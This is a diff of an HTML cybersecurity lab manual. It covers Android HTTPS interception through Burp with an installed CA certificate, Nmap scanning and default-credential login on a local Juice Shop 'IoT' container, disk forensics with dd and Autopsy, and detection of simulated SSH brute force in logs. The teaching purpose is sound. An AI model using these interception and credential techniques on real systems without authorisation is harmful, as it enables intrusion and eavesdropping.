+        <div class="qa-item"><span class="qa-q">Q2</span><span class="qa-a">What is brute force attack? — Systematically trying all possible passwords until the correct one is found.</span></div>
+        <div class="qa-item"><span class="qa-q">Q3</span><span class="qa-a">What is session hijacking? — Stealing a valid session ID and using it to impersonate the victim.</span></div>
+        <div class="qa-item"><span class="qa-q">Q4</span><span class="qa-a">What is session fixation? — Attacker forces a known session ID; victim logs in with it, giving attacker access.</span></div>
+        <div class="qa-item"><span class="qa-q">Q5</span><span class="qa-a">How to prevent session attacks? — Use HTTPS, regenerate session ID on login, set HttpOnly &amp; Secure cookie flags, implement proper logout that destroys server session.</span></div>
+      </div>
+
+      <div class="section">
+        <div class="section-label">Conclusion</div>
+        <div class="conclusion">
+          <p class="conclusion-text">Authentication and session management vulnerabilities were successfully identified in DVWA. The experiment demonstrates why secure authentication (rate limiting, lockout, strong passwords) and proper session handling (regeneration, secure cookies, server-side invalidation on logout) are mandatory for web application security.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+
+  <!-- EXP 08 -->
+  <div class="experiment" id="exp08" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number">08</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">Mobile Security &mdash; Android Traffic Interception</div>
+        <div class="exp-subtitle">Android Studio &middot; Burp Suite &middot; ADB &middot; Windows CMD</div>
+      </div>
+      <div class="exp-toggle">&#9662;</div>
+    </div>
+    <div class="exp-body">
+      <div class="section">
+        <div class="section-label">Aim</div>
+        <p>Intercept HTTP and HTTPS traffic from an Android emulator using Burp Suite as a proxy &mdash; demonstrating how mobile app communications can be monitored.</p>
+      </div>
+      <div class="section">
+        <div class="section-label">Requirements</div>
+        <div class="tools">
+          <span class="tool-pill">Android Studio Emulator</span>
+          <span class="tool-pill">Burp Suite</span>
+          <span class="tool-pill">ADB platform-tools</span>
+          <span class="tool-pill">Windows CMD</span>
+        </div>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 1 &mdash; Navigate to Emulator Folder</div>
+        <div class="cb-wrap"><span class="cb-label">Windows CMD</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator</pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 2 &mdash; List Available Virtual Devices</div>
+        <div class="cb-wrap"><span class="cb-label">CMD</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>emulator -list-avds
+<span class="cm"># Output: Pixel_9  (or Pixel_2 etc.)</span></pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 3 &mdash; Start Emulator with Burp Proxy</div>
+        <div class="cb-wrap"><span class="cb-label">CMD</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>emulator -avd Pixel_9 -http-proxy http://10.0.2.2:8080
+<span class="cm"># 10.0.2.2 = how Android emulator reaches the Windows host</span></pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 4 &mdash; Configure Burp Suite (GUI)</div>
+        <div class="code-block"><pre>Proxy -&gt; Proxy Settings -&gt; Proxy Listeners -&gt; Edit
+-&gt; Binding tab -&gt; All interfaces -&gt; OK
+-&gt; Intercept ON</pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 5 &mdash; Set Proxy via ADB</div>
+        <div class="cb-wrap"><span class="cb-label">New CMD Window</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
 
 adb devices
-<span class="comment"># Should show: emulator-5554  device</span>
+<span class="cm"># Output: emulator-5554  device</span>
 
 adb shell settings put global http_proxy 10.0.2.2:8080
 
-<span class="comment"># Verify it's set:</span>
+<span class="cm"># Verify:</span>
 adb shell settings get global http_proxy
-<span class="comment"># Output: 10.0.2.2:8080</span></pre>
+<span class="cm"># Output: 10.0.2.2:8080</span></pre></div>
       </div>
-    </div>
+      <div class="section">
+        <div class="section-label">Step 6 &mdash; Test HTTP &amp; HTTPS Interception</div>
+        <div class="code-block"><pre><span class="cm"># In Android emulator Chrome: visit http://example.com</span>
+<span class="cm"># Burp: Proxy -&gt; HTTP History -&gt; request appears</span>
 
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#00c89620;color:var(--e15);">6</div>
-        <div class="step-title">Test HTTP Interception</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<span class="cm"># For HTTPS: export Burp CA cert</span>
+Burp -&gt; Proxy -&gt; Proxy Settings -&gt; Import/Export CA Certificate
+-&gt; DER format -&gt; Save as burpcer.der
+
+<span class="cm"># Push cert to emulator:</span>
+adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/
+
+<span class="cm"># Install cert in emulator:</span>
+Settings -&gt; Security &amp; Privacy -&gt; Encryption &amp; Credentials
+-&gt; Install a Certificate -&gt; CA Certificate -&gt; burpcer.der
+
+<span class="cm"># Now visit https://example.com -&gt; HTTPS traffic captured!</span></pre></div>
       </div>
-      <div class="step-body">
-        <div class="note">In the Android emulator, open Chrome browser.</div>
-        <pre>Visit: http://example.com
-
-→ Go to Burp Suite → Proxy → HTTP History
-→ You should see the request appear ✅</pre>
+      <div class="section">
+        <div class="section-label">Result</div>
+        <div class="conclusion">
+          <p class="conclusion-text">Android application network traffic was successfully intercepted using Burp Suite. By configuring ADB proxy settings and installing the Burp CA certificate, both HTTP and HTTPS traffic from the emulator were captured and analyzed.</p>
+        </div>
       </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#00c89620;color:var(--e15);">7</div>
-        <div class="step-title">Export Burp CA Certificate (for HTTPS)</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>Burp Suite → Proxy → Proxy Settings
-→ Import/Export CA Certificate
-→ Certificate in DER format
-→ Save as: burpcer.der  (in Downloads folder)</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#00c89620;color:var(--e15);">8</div>
-        <div class="step-title">Push Certificate to Emulator</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#00c89620;color:var(--e15);">9</div>
-        <div class="step-title">Install Certificate in Emulator</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>Settings → Security & Privacy
-→ More Security & Privacy
-→ Encryption & Credentials
-→ Install a Certificate → CA Certificate
-→ Select: burpcer.der ✅</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#00c89620;color:var(--e15);">10</div>
-        <div class="step-title">Verify HTTPS Interception</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>Visit in emulator Chrome: https://example.com
-
-→ Burp Suite → Proxy → HTTP History
-→ HTTPS request now visible ✅</pre>
-      </div>
-    </div>
-
-  </div>
-
-  <div class="result-box" style="border-color:var(--e15);">
-    <div class="label" style="color:var(--e15);">Result</div>
-    <p>Android application network traffic was successfully intercepted and analysed using Burp Suite by configuring proxy settings in the Android emulator and installing the Burp Suite CA certificate. Both HTTP and HTTPS traffic were captured.</p>
-  </div>
-</div>
-
-<hr class="divider">
-
-<!-- ═══════════════════════════════════════════ -->
-<!-- EXP 16 -->
-<!-- ═══════════════════════════════════════════ -->
-<div class="section" id="exp16">
-  <div class="section-header">
-    <div class="exp-number" style="border-color:var(--e16);color:var(--e16);">EXP 16</div>
-    <div>
-      <h2>IoT Device Security — Default Passwords & Open Ports</h2>
-      <div class="tools-line">Docker (Windows) · Nmap (Kali Linux) · Browser DevTools</div>
     </div>
   </div>
 
-  <div class="info-row">
-    <span class="tag">Aim</span>
-    <span style="font-size:12px;color:var(--muted);">Identify open ports, default credentials, and unencrypted communication on a simulated IoT device.</span>
-  </div>
-
-  <div class="steps">
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#ff6b3520;color:var(--e16);">1</div>
-        <div class="step-title">Deploy Simulated IoT Device (Windows)</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+  <!-- EXP 09 -->
+  <div class="experiment" id="exp09" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number">09</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">IoT Device Security &mdash; Default Passwords &amp; Open Ports</div>
+        <div class="exp-subtitle">Docker &middot; Nmap &middot; Kali Linux &middot; Browser DevTools</div>
       </div>
-      <div class="step-body">
-        <pre>docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
-
-<span class="comment"># Open browser → http://localhost:8090</span>
-<span class="comment"># This is your simulated IoT device dashboard</span></pre>
-      </div>
+      <div class="exp-toggle">&#9662;</div>
     </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#ff6b3520;color:var(--e16);">2</div>
-        <div class="step-title">Find Windows IP Address</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    <div class="exp-body">
+      <div class="section">
+        <div class="section-label">Aim</div>
+        <p>Identify open ports, default credentials, and unencrypted communication on a simulated IoT device using Docker and Nmap.</p>
       </div>
-      <div class="step-body">
-        <div class="note">Run this in Windows CMD. Note down the IPv4 address.</div>
-        <pre>ipconfig
-<span class="comment"># Look for: IPv4 Address . . . : 192.168.0.148</span>
-<span class="comment"># This is the IP Kali will scan</span></pre>
+      <div class="section">
+        <div class="section-label">Step 1 &mdash; Deploy Simulated IoT Device (Windows)</div>
+        <div class="cb-wrap"><span class="cb-label">Windows CMD</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
+<span class="cm"># Open browser: http://localhost:8090</span></pre></div>
       </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#ff6b3520;color:var(--e16);">3</div>
-        <div class="step-title">Scan from Kali Linux using Nmap</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <div class="section">
+        <div class="section-label">Step 2 &mdash; Find Windows IP Address</div>
+        <div class="cb-wrap"><span class="cb-label">Windows CMD</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>ipconfig
+<span class="cm"># Note: IPv4 Address e.g. 192.168.0.148</span></pre></div>
       </div>
-      <div class="step-body">
-        <div class="note">Switch to Kali Linux machine. Replace IP with your actual Windows IP.</div>
-        <pre>nmap -sV 192.168.0.148
-
-<span class="comment"># -sV = service version detection</span>
-<span class="comment"># Expected output:</span>
-<span class="comment"># PORT     STATE SERVICE VERSION</span>
-<span class="comment"># 8090/tcp open  http    Node.js (Express)</span>
-<span class="comment"># 135/tcp  open  msrpc   Microsoft Windows RPC</span>
-<span class="comment"># 445/tcp  open  microsoft-ds</span></pre>
+      <div class="section">
+        <div class="section-label">Step 3 &mdash; Scan with Nmap from Kali Linux</div>
+        <div class="cb-wrap"><span class="cb-label">Kali Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>nmap -sV 192.168.0.148
+<span class="cm"># -sV = service version detection</span>
+<span class="cm"># Expected output:</span>
+<span class="cm"># PORT     STATE SERVICE VERSION</span>
+<span class="cm"># 8090/tcp open  http    Node.js (Express)</span>
+<span class="cm"># 135/tcp  open  msrpc   Microsoft Windows RPC</span></pre></div>
       </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#ff6b3520;color:var(--e16);">4</div>
-        <div class="step-title">Test Default Credentials (Windows Browser)</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">Go to http://localhost:8090 → click Account → Login</div>
-        <pre>Email:    admin@juice-sh.op
+      <div class="section">
+        <div class="section-label">Step 4 &mdash; Test Default Credentials</div>
+        <div class="code-block"><pre><span class="cm"># In browser: http://localhost:8090 -&gt; Account -&gt; Login</span>
+Email:    admin@juice-sh.op
 Password: admin123
-
-<span class="comment"># Successful login = Default password vulnerability ✅</span></pre>
+<span class="cm"># Successful login = Default password vulnerability confirmed!</span></pre></div>
+        <div class="output-block">
+          <div class="output-line">&#10003; Login successful with default credentials</div>
+          <div class="output-line inp">&#9888; No password change enforced &mdash; critical IoT flaw</div>
+        </div>
       </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#ff6b3520;color:var(--e16);">5</div>
-        <div class="step-title">Check Unencrypted Communication</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <div class="section">
+        <div class="section-label">Step 5 &mdash; Check Unencrypted Communication</div>
+        <div class="code-block"><pre><span class="cm"># In browser on Juice Shop page:</span>
+Press F12 -&gt; Network tab -&gt; reload page
+-&gt; Protocol column shows "http" not "https"
+-&gt; All data in plain text = vulnerability!</pre></div>
       </div>
-      <div class="step-body">
-        <div class="note">In browser on Juice Shop page:</div>
-        <pre>Press F12 → Network tab → reload page
-→ Check Protocol column: shows "http" not "https"
-→ All data transmitted in plain text = vulnerability ✅</pre>
+      <div class="section">
+        <div class="section-label">Result</div>
+        <div class="conclusion">
+          <p class="conclusion-text">Open ports discovered via Nmap (8090 running Node.js). Default credentials granted full access. Browser DevTools confirmed all traffic is unencrypted HTTP &mdash; three critical IoT vulnerabilities demonstrated in one experiment.</p>
+        </div>
       </div>
-    </div>
-
-  </div>
-
-  <div class="result-box" style="border-color:var(--e16);">
-    <div class="label" style="color:var(--e16);">Result</div>
-    <p>The experiment demonstrated how an attacker on the same network can identify open ports (8090), detect running services and versions via Nmap, gain unauthorized access using default credentials (admin@juice-sh.op / admin123), and confirm unencrypted HTTP communication through browser DevTools.</p>
-  </div>
-</div>
-
-<hr class="divider">
-
-<!-- ═══════════════════════════════════════════ -->
-<!-- EXP 17 -->
-<!-- ═══════════════════════════════════════════ -->
-<div class="section" id="exp17">
-  <div class="section-header">
-    <div class="exp-number" style="border-color:var(--e17);color:var(--e17);">EXP 17</div>
-    <div>
-      <h2>Disk Forensics — dc3dd and Autopsy</h2>
-      <div class="tools-line">Kali Linux · dd · mkfs · Autopsy</div>
     </div>
   </div>
 
-  <div class="info-row">
-    <span class="tag">Aim</span>
-    <span style="font-size:12px;color:var(--muted);">Create a forensic disk image and analyze digital evidence using Autopsy.</span>
-  </div>
-
-  <div class="steps">
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#a78bfa20;color:var(--e17);">1</div>
-        <div class="step-title">Open Terminal</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+  <!-- EXP 10 -->
+  <div class="experiment" id="exp10" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number">10</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">Disk Forensics &mdash; dd &amp; Autopsy</div>
+        <div class="exp-subtitle">Kali Linux &middot; dd &middot; mkfs.ext4 &middot; Autopsy &middot; localhost:9999</div>
       </div>
-      <div class="step-body">
-        <pre>Ctrl + Alt + T</pre>
+      <div class="exp-toggle">&#9662;</div>
+    </div>
+    <div class="exp-body">
+      <div class="section">
+        <div class="section-label">Aim</div>
+        <p>Create a forensic disk image and analyze digital evidence using Autopsy &mdash; the standard digital forensics workflow.</p>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 1 &mdash; Create Evidence File</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>echo "Cybersecurity Lab Evidence" &gt; evidence.txt
+ls</pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 2 &mdash; Check Disk Partitions</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>lsblk
+<span class="cm"># Shows: sda, sda1, sda2 etc.</span></pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 3 &mdash; Create 100MB Virtual Disk Image</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>dd if=/dev/zero of=practice_disk.dd bs=1M count=100
+<span class="cm"># if=input(zeros)  of=output file  bs=block size  count=blocks</span></pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 4 &mdash; Format the Disk Image</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>mkfs.ext4 practice_disk.dd</pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 5 &mdash; Verify &amp; Launch Autopsy</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>ls -lh practice_disk.dd
+<span class="cm"># Output: 100M practice_disk.dd</span>
+
+autopsy
+<span class="cm"># Open Firefox: http://localhost:9999/autopsy</span></pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 6 &mdash; Create Case &amp; Add Image (Autopsy GUI)</div>
+        <div class="code-block"><pre><span class="cm"># Create New Case:</span>
+Case Name: CyberLabCase
+Investigator: (your name)
+-&gt; New Case -&gt; OK
+
+<span class="cm"># Add Host:</span>
+Host Name: KaliLabMachine -&gt; Add Host -&gt; OK
+
+<span class="cm"># Add Image:</span>
+Add Image -&gt; Add Image File
+-&gt; Browse: /home/kali/practice_disk.dd
+-&gt; Import Method: Symlink -&gt; Next</pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 7 &mdash; Analyze Evidence</div>
+        <div class="code-block"><pre>Click: File Analysis     -&gt; view all files
+Click: Keyword Search    -&gt; search "evidence"
+Click: File Type         -&gt; filter images, docs
+Click: Deleted Files     -&gt; recoverable deleted files
+Click: Meta Data         -&gt; timestamps (created/modified)</pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Result</div>
+        <div class="conclusion">
+          <p class="conclusion-text">A 100MB forensic disk image was created using <code>dd</code> and formatted using <code>mkfs.ext4</code>. Imported into Autopsy at localhost:9999. File artifacts, metadata, deleted files, and keyword search were examined &mdash; complete digital forensics workflow demonstrated.</p>
+        </div>
       </div>
     </div>
+  </div>
 
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#a78bfa20;color:var(--e17);">2</div>
-        <div class="step-title">Create Sample Evidence File</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+  <!-- EXP 11 -->
+  <div class="experiment" id="exp11" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number">11</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">Log File Analysis for Incident Detection</div>
+        <div class="exp-subtitle">journalctl &middot; grep &middot; awk &middot; sort &middot; uniq &middot; ssh &middot; Kali Linux</div>
       </div>
-      <div class="step-body">
-        <div class="note">This simulates a file left by a user — to be discovered during forensic analysis.</div>
-        <pre>echo "Cybersecurity Lab Evidence" > evidence.txt
+      <div class="exp-toggle">&#9662;</div>
+    </div>
+    <div class="exp-body">
+      <div class="section">
+        <div class="section-label">Aim</div>
+        <p>Analyze system log files and detect suspicious activities such as failed login attempts and brute force attacks using Linux command-line tools.</p>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 1 &mdash; Navigate to Log Directory</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>cd /var/log
 ls
-<span class="comment"># Verify: evidence.txt appears in listing</span></pre>
+<span class="cm"># apache2/  -&gt; web server logs</span>
+<span class="cm"># journal/  -&gt; system logs (most important)</span>
+<span class="cm"># wtmp      -&gt; successful logins</span>
+<span class="cm"># btmp      -&gt; failed logins</span></pre></div>
       </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#a78bfa20;color:var(--e17);">3</div>
-        <div class="step-title">Check Disk Partitions</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <div class="section">
+        <div class="section-label">Step 2 &mdash; View Login History</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>last         <span class="cm"># successful logins</span>
+sudo lastb   <span class="cm"># failed logins</span></pre></div>
       </div>
-      <div class="step-body">
-        <pre>lsblk
-<span class="comment"># Output example:</span>
-<span class="comment"># sda</span>
-<span class="comment"># ├─sda1   ← this is used for real disk imaging</span>
-<span class="comment"># └─sda2</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#a78bfa20;color:var(--e17);">4</div>
-        <div class="step-title">Create 100MB Virtual Disk Image</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">if = input (zeros), of = output file, bs = block size, count = number of blocks</div>
-        <pre>dd if=/dev/zero of=practice_disk.dd bs=1M count=100</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#a78bfa20;color:var(--e17);">5</div>
-        <div class="step-title">Format the Disk</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">Gives the disk a filesystem so Autopsy can read it.</div>
-        <pre>mkfs.ext4 practice_disk.dd</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#a78bfa20;color:var(--e17);">6</div>
-        <div class="step-title">Verify the Image Was Created</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>ls -lh practice_disk.dd
-<span class="comment"># Should show: 100M practice_disk.dd</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#a78bfa20;color:var(--e17);">7</div>
-        <div class="step-title">Launch Autopsy</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>autopsy
-<span class="comment"># Terminal shows URL → open in browser:</span>
-<span class="comment"># http://localhost:9999/autopsy</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#a78bfa20;color:var(--e17);">8</div>
-        <div class="step-title">Create New Case in Autopsy</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>Click: Create New Case
-→ Case Name: CyberLabCase
-→ Description: Kali Linux forensic investigation
-→ Investigator: (your name)
-→ Click: New Case → OK</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#a78bfa20;color:var(--e17);">9</div>
-        <div class="step-title">Add Host</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>Click: Add Host
-→ Host Name: KaliLabMachine
-→ All other fields: Leave Blank
-→ Click: Add Host → OK</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#a78bfa20;color:var(--e17);">10</div>
-        <div class="step-title">Add Disk Image</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>Click: Add Image → Add Image File
-→ Browse to: /home/kali/practice_disk.dd
-→ Import Method: Symlink
-→ Click: Next
-<span class="comment"># Autopsy begins analyzing the disk image</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#a78bfa20;color:var(--e17);">11</div>
-        <div class="step-title">Analyze Evidence</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>Click: File Analysis      → view all files on disk
-Click: Keyword Search      → search for "evidence"
-Click: File Type           → filter by images, docs
-Click: Deleted Files       → files deleted but recoverable
-Click: Meta Data           → timestamps (created/modified)</pre>
-      </div>
-    </div>
-
-  </div>
-
-  <div class="result-box" style="border-color:var(--e17);">
-    <div class="label" style="color:var(--e17);">Result</div>
-    <p>A 100MB forensic disk image was successfully created using the dd command and formatted using mkfs.ext4. The image was imported into Autopsy at localhost:9999. File artifacts, metadata, and deleted files were examined. Hashing confirmed the integrity of the acquired image.</p>
-  </div>
-</div>
-
-<hr class="divider">
-
-<!-- ═══════════════════════════════════════════ -->
-<!-- EXP 18 -->
-<!-- ═══════════════════════════════════════════ -->
-<div class="section" id="exp18">
-  <div class="section-header">
-    <div class="exp-number" style="border-color:var(--e18);color:var(--e18);">EXP 18</div>
-    <div>
-      <h2>Log File Analysis for Incident Detection</h2>
-      <div class="tools-line">Kali Linux · journalctl · grep · awk · ssh</div>
-    </div>
-  </div>
-
-  <div class="info-row">
-    <span class="tag">Aim</span>
-    <span style="font-size:12px;color:var(--muted);">Analyze system log files and detect suspicious activities such as failed login attempts and brute force attacks.</span>
-  </div>
-
-  <div class="steps">
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#f59e0b20;color:var(--e18);">1</div>
-        <div class="step-title">Navigate to Log Directory</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>cd /var/log
-ls
-<span class="comment"># Key files:</span>
-<span class="comment"># apache2/   → web server logs</span>
-<span class="comment"># journal/   → system logs (most important)</span>
-<span class="comment"># wtmp       → successful logins</span>
-<span class="comment"># btmp       → failed logins</span>
-<span class="comment"># dpkg.log   → package activity</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#f59e0b20;color:var(--e18);">2</div>
-        <div class="step-title">View Successful Logins</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>last
-<span class="comment"># Shows: who logged in, when, from where</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#f59e0b20;color:var(--e18);">3</div>
-        <div class="step-title">View Failed Logins</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>sudo lastb
-<span class="comment"># Shows all failed login attempts</span>
-<span class="comment"># Repeated entries from same user = suspicious</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#f59e0b20;color:var(--e18);">4</div>
-        <div class="step-title">Setup SSH Server</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>sudo apt install openssh-server -y
+      <div class="section">
+        <div class="section-label">Step 3 &mdash; Setup SSH Server</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>sudo apt install openssh-server -y
 sudo service ssh start
 sudo service ssh status
-<span class="comment"># Should show: active (running)</span></pre>
+<span class="cm"># Should show: active (running)</span></pre></div>
       </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#f59e0b20;color:var(--e18);">5</div>
-        <div class="step-title">Simulate Brute Force Attack</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <div class="section">
+        <div class="section-label">Step 4 &mdash; Simulate Brute Force</div>
+        <div class="cb-wrap"><span class="cb-label">Run 5-10 times with wrong password</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>ssh fakeuser@localhost
+<span class="cm"># Wrong password -&gt; Enter -&gt; Ctrl+C -&gt; repeat 5-10 times</span></pre></div>
       </div>
-      <div class="step-body">
-        <div class="note">Run this command 5–10 times. Enter a wrong password each time. Press Ctrl+C to cancel between attempts.</div>
-        <pre>ssh fakeuser@localhost
-<span class="comment"># Type wrong password → press Enter → Ctrl+C → repeat</span>
-<span class="comment"># Do this 5-10 times to generate log data</span></pre>
+      <div class="section">
+        <div class="section-label">Step 5 &mdash; Detect Failed Login Attempts</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>journalctl | grep "Failed password"
+<span class="cm"># Shows each failed attempt with timestamp and IP</span></pre></div>
       </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#f59e0b20;color:var(--e18);">6</div>
-        <div class="step-title">Detect Failed Login Attempts</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <div class="section">
+        <div class="section-label">Step 6 &mdash; Extract &amp; Count IPs (Key Command)</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal &mdash; MOST IMPORTANT</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr
+<span class="cm"># Output: 10 127.0.0.1  &lt;-- brute force detected!</span></pre></div>
       </div>
-      <div class="step-body">
-        <pre>journalctl | grep "Failed password"
-<span class="comment"># Output:</span>
-<span class="comment"># May 06 11:23:11 kali sshd[1234]: Failed password for fakeuser from 127.0.0.1 port 54321</span>
-<span class="comment"># May 06 11:23:14 kali sshd[1235]: Failed password for fakeuser from 127.0.0.1 port 54322</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
